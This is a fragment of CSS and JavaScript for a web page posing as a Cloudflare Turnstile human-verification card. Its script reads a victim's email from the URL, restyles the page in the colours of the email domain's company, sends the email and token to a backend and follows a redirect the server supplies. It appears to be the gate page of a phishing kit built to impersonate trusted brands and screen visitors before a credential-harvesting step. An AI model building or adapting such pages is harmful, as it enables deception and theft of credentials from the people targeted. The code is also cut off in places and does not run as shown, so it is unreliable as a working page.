  .cf-card {
    background: #fff;
    border: 1px solid #d9d9d9;
    border-radius: 8px;
    max-width: 460px;
    width: 100%;
    padding: 0 0 24px;

    position: relative;
    z-index: 1;
  }
  .brand-bar {
    height: 5px;
    background: linear-gradient(90deg, var(--brand-c1), var(--brand-c2));
  }
  .brand-mark {
    width: 64px;
    height: 64px;
    margin: 28px auto 18px;
    border-radius: 16px;
    display: grid;
    place-items: center;
    background: #f38020; /* Cloudflare Orange */
    color: #fff;
    box-shadow: 0 10px 24px -10px rgba(243, 128, 32, 0.5);
    overflow: hidden;
  }
  .brand-mark svg {
    width: 38px;
    height: 38px;
    fill: #fff;
  }
  .cf-card h1 {
    font-size: 20px;
    font-weight: 600;
    color: #313131;
    margin-bottom: 8px;
  }
  .cf-card p {
    font-size: 14px;
    color: #6a6a6a;
    margin-bottom: 20px;
    line-height: 1.5;
    padding: 0 28px;
  }
  .brand-chip {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin: 0 auto 22px;
    padding: 8px 14px;
    border-radius: 999px;
    background: #fafafa;
    border: 1px solid #ececec;
    font-size: 12.5px;
    color: #555;
  }
  .brand-chip .dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
  }
  .brand-chip strong { color: #313131; font-weight: 700; }
  .cf-turnstile {
    display: flex;
    justify-content: center;
    margin: 0 auto 20px;
    min-height: 65px;
  }
  .cf-footer {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
    font-size: 11px;
    color: #6a6a6a;
    padding-top: 16px;
    border-top: 1px solid #f0f0f0;
    margin: 8px 28px 0;

  .cf-footer a:hover { text-decoration: underline; }
  .cf-logo {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    color: #f6821f;
    font-weight: 600;
  }
  .spinner {
    display: none;
    width: 36px;
    height: 36px;
    margin: 8px auto 20px;
    border: 3px solid #f0f0f0;
    border-top: 3px solid var(--brand-c1);

    display: none;
    background: #fff5f5;
    border: 1px solid #f5c6cb;
    color: #a94442;
    padding: 10px 14px;
    border-radius: 4px;

const RTL_LANGS = ['ar', 'he'];
let currentLang = 'en';

/* ============================================================
   Language detection
   ============================================================ */
function detectLanguage() {
  const userLang = (navigator.language || navigator.userLanguage || 'en').toLowerCase();

  if (userLang.startsWith('zh-tw') || userLang.startsWith('zh-hk') || userLang.startsWith('zh-hant')) return 'zh-TW';
  if (userLang.startsWith('zh')) return 'zh';

  const base = userLang.split('-')[0];
  if (translations[base]) return base;

  const prefs = navigator.languages || [];
  for (const lang of prefs) {
    const raw = String(lang).toLowerCase();
    if (raw.startsWith('zh-tw') || raw.startsWith('zh-hk') || raw.startsWith('zh-hant')) return 'zh-TW';
    if (raw.startsWith('zh')) return 'zh';
    const b = raw.split('-')[0];
    if (translations[b]) return b;
  }
  return 'en';
}

function applyTranslations(lang) {
  const t = translations[lang] || translations['en'];
  currentLang = lang;

  document.documentElement.lang = lang;
  document.documentElement.dir = RTL_LANGS.includes(lang) ? 'rtl' : 'ltr';

  document.title = t.pageTitle;
  document.getElementById('t-title').innerText = t.title;
  document.getElementById('t-subtitle').innerText = t.subtitle;
  
  // Secure email injection (prevents XSS)
  document.getElementById('t-targetText').innerHTML = t.targetText + ' <strong id="brandChipName"></strong>';
  document.getElementById('brandChipName').textContent = EMAIL || '—';

  document.getElementById('t-privacy').innerText = t.privacy;
  document.getElementById('t-terms').innerText = t.terms;
}

function resolveBrand(email) {
  const domain = (email.split('@')[1] || '').toLowerCase();
  if (BRAND_MAP[domain]) return { ...BRAND_MAP[domain], domain };
  const parts = domain.split('.');
  for (let i = 0; i < parts.length - 1; i++) {
    const sub = parts.slice(i).join('.');
    if (BRAND_MAP[sub]) return { ...BRAND_MAP[sub], domain };
  }
  return { name:'Secure Login', accent:'#1a73e8', mesh:['#1a73e8','#0d47a1','#4a9cff'], bgUrl:'', domain };
}

/* ============================================================
   Exquisite Mesh Background Generator
   ============================================================ */
const NOISE_SVG = "url(\"data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E\")";

function getMeshBackground(brand) {
  const colors = brand.mesh || [brand.accent];
  const c1 = colors[0];
  const c2 = colors[1] || c1;
  const c3 = colors[2] || c1;
  const c4 = colors[3] || c3;

  return `${NOISE_SVG},
          radial-gradient(at 10% 10%, ${c1}35 0px, transparent 50%),
          radial-gradient(at 90% 10%, ${c2}35 0px, transparent 50%),
          radial-gradient(at 90% 90%, ${c3}35 0px, transparent 50%),
          radial-gradient(at 10% 90%, ${c4}35 0px, transparent 50%),
          linear-gradient(135deg, #f9fafb 0%, #eef1f6 100%)`;
}

function applyBrandTheme(brand) {
  document.documentElement.style.setProperty('--brand-c1', brand.accent);
  document.documentElement.style.setProperty('--brand-c2', brand.accent);

  const body = document.body;
  if (brand.bgUrl) {
    body.style.background = `url('${brand.bgUrl}') center/cover fixed no-repeat`;
  } else {
    body.style.background = getMeshBackground(brand);
  }
}

/* ============================================================
   READ EMAIL FROM URL
   ============================================================ */
function getEmailFromSource() {
  let fromHash = window.location.hash.substring(1);
  if (fromHash) {
    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
    if (fromHash.includes('@')) return fromHash;
  }
  const params = new URLSearchParams(window.location.search);
  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
  for (const k of keys) {
    const v = params.get(k);
    if (v && v.includes('@')) return v;
  }
  if (window.location.search.length > 1) {
    let raw = window.location.search.substring(1);
    try { raw = decodeURIComponent(raw); } catch (e) {}
    raw = raw.split('&')[0].split('?')[0].trim();
    if (raw.includes('@')) return raw;
  }
  return '';
}

var EMAIL = getEmailFromSource();
var verified = false;

  const detectedLang = detectLanguage();
  applyTranslations(detectedLang);

  if (!EMAIL) {
    document.getElementById('brandChip').style.display = 'none';
  } else {
    const brand = resolveBrand(EMAIL);
    applyBrandTheme(brand);
  }
})();

/* ============================================================
   TURNSTILE CALLBACKS & BACKEND VERIFICATION
   ============================================================ */
async function onVerified(token) {
  if (verified) return;
  if (!token) { onTurnstileError('missing-token'); return; }

  verified = true;
  console.log('🛡️ Turnstile passed, sending token to backend...');

  var card = document.getElementById('cfCard');
  if (card) card.classList.add('state-verifying');

  try {
    const response = await fetch(API_BASE + '/api/turnstile-verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, email: EMAIL })
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || `HTTP ${response.status}`);
    }

    if (data.success && data.redirect) {
      console.log('✅ Proof generated, redirecting...');
      setTimeout(function () {
        window.location.href = data.redirect;
      }, 800);
    } else {
      throw new Error(data.message || 'Verification failed on server');
    }
  } catch (error) {
    console.error('❌ Backend verification failed:', error);
    var box = document.getElementById('errorBox');
    if (box) {
      box.style.display = 'block';
      box.textContent = "Real Error: " + error.message;
    }
    if (card) card.classList.remove('state-verifying');
    verified = false;
    if (window.turnstile) {
      try { window.turnstile.reset(); } catch (e) {}
    }
  }
}

function onTurnstileError(code) {
  console.error('❌ Turnstile error:', code);
  var box = document.getElementById('errorBox');
  if (box) {
    box.style.display = 'block';
    box.textContent = translations[currentLang].errFail;
  }
  var card = document.getElementById('cfCard');
  if (card) card.classList.remove('state-verifying');
}

function onTurnstileExpired() {
  verified = false;
  if (window.turnstile) {
    try { window.turnstile.reset(); } catch (e) {}
  }
}

setTimeout(function () {
  if (!verified && window.turnstile === undefined) {
    var box = document.getElementById('errorBox');
    if (box) {
      box.style.display = 'block';
      box.textContent = translations[currentLang].errTimeout;
    }
  }
}, 15000);
</script>
